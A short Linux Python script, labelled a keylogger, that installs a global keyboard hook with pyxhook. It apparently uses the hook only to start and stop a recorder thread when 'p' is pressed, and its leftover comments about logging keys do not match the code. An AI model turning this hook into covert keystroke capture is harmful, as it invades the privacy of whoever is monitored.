# Python code for keylogger
# to be used in linux
import os
import pyxhook
import recorder
import state
import threading



# Allow setting the cancel key from environment args, Default: `
cancel_key = ord(
	os.environ.get(
		'pylogger_cancel',
		'`'
	)[0]
)




#creating key pressing event and saving it into log file
def OnKeyPress(event):
		if event.Key == 'p':
			one = recorder.recorder.getInstance()
			two = state.state.getInstance()
			if two.status:
				print("stop")
				two.status = False
			else:
				print("start")
				t = threading.Thread(target=one.start)
				t.start()






# create a hook manager objectp
new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
# set the hook
new_hook.HookKeyboard()
try:
	new_hook.start()		 # start the hook
except KeyboardInterrupt:
	# User cancelled from command line.
	pass
except Exception as ex:
	# Write exceptions to the log file, for analysis later.	msg = 'Error while catching events:\n {}'.format(ex)
	pyxhook.print_err(ex)
